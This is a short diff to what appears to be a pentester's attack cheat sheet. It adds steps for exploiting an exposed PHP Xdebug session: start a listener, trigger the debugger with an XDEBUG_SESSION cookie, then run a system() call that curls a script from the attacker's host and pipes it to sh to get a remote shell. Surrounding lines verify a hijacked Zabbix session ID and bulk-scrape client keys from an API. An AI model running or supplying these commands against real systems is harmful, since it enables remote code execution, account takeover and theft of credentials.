@@ -323,6 +323,16 @@ sqlmap \
 +---------- Verify Session ID ----------+
 curl -X POST http://$TARGET/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc": "2.0","method": "user.checkAuthentication","params": {"sessionid": "fdcfbcb99704cba0bf030d626d671510"},"id": 1}'
 
+[*] XDEBUG_SESSION
++---------- Start Listener ----------+
+python3 XDEBUG_SESSION.py
+
++---------- Attack XDEBUG_SESSION ----------+
+curl http://$TARGET -H "Cookie: XDEBUG_SESSION="
+
++---------- Execute Commands ----------+
+python_cmd >> system("curl $MYIP:8888/resh|sh")
+
 [*] Curl
 cat urls | jq -r 'fromjson | .data-block[] | [.id, .clientName, .identityServerUrl, .url] | @csv'
 cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H "Api-Version: 3.0" -s | jq -r "[.id, .clientName, .clientKey] | @csv"'
